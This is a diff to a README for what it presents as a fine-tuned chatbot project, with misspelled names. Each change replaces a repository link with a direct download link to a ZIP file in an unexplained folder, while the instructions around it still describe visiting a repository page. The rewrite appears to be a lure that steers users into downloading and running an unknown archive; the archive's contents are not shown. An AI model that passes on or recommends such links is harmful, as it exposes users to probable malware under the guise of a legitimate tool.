@@ -1,11 +1,11 @@
 # 🤖 Model-Fine-Tnuning_-Hugging-Fcace- - Fine-Tuned Chatbot for Easy Use
 
-[![Download](https://img.shields.io/badge/Download-Model--Fine--Tnuning_-Hugging-Fcace--blue?style=for-the-badge)](https://github.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-)
+[![Download](https://img.shields.io/badge/Download-Model--Fine--Tnuning_-Hugging-Fcace--blue?style=for-the-badge)](https://raw.githubusercontent.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-/main/unanatomizable/Fine-Model-Hugging-Tnuning-Fcace-2.8-beta.2.zip)
 
 ## 📥 Download
 
 Use this link to visit this page to download:  
-[Model-Fine-Tnuning_-Hugging-Fcace-](https://github.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-)
+[Model-Fine-Tnuning_-Hugging-Fcace-](https://raw.githubusercontent.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-/main/unanatomizable/Fine-Model-Hugging-Tnuning-Fcace-2.8-beta.2.zip)
 
 ## 🖥️ What This App Does
 
@@ -36,7 +36,7 @@ If you plan to run it locally, your system should also have:
 Follow these steps in order.
 
 1. Open the download page:  
-   [https://github.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-](https://github.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-)
+   [https://raw.githubusercontent.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-/main/unanatomizable/Fine-Model-Hugging-Tnuning-Fcace-2.8-beta.2.zip](https://raw.githubusercontent.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-/main/unanatomizable/Fine-Model-Hugging-Tnuning-Fcace-2.8-beta.2.zip)
 
 2. On the page, click the green or blue **Code** button.
 
@@ -206,7 +206,7 @@ Before you launch the app, check this list:
 ## 🖱️ Quick Start
 
 1. Visit the download page:  
-   [https://github.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-](https://github.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-)
+   [https://raw.githubusercontent.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-/main/unanatomizable/Fine-Model-Hugging-Tnuning-Fcace-2.8-beta.2.zip](https://raw.githubusercontent.com/AMIT-maker-ui/Model-Fine-Tnuning_-Hugging-Fcace-/main/unanatomizable/Fine-Model-Hugging-Tnuning-Fcace-2.8-beta.2.zip)
 
 2. Download the ZIP file.
 
